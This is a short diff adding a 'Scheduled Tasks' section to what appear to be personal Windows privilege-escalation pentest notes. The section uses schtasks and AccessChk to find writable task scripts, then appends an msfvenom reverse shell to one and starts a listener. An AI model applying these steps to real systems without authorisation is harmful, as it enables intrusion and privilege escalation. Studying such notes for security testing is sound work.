@@ -33,3 +33,16 @@ use exploitname
 set SESSION [meterpreter SESSION number]
 set LPORT
 run
+
+<h2> Scheduled Tasks</h2>
+View tasks --- schtasks /query /fo LIST /v 
+
+AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify the script
+download here ---- https://github.com/ankh2054/windows-pentest
+bypass EULA -- .\accesschk.exe /accepteula -quvw userofscheduledtaskcheckingpermission C:\Users\Administrator\Desktop\taskfilelocation
+e.g --- .\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
+create msfvenom shell and transfer over to victim machine
+echo path_to_shell >> path_to_scheduled_script
+setup listener
+
+
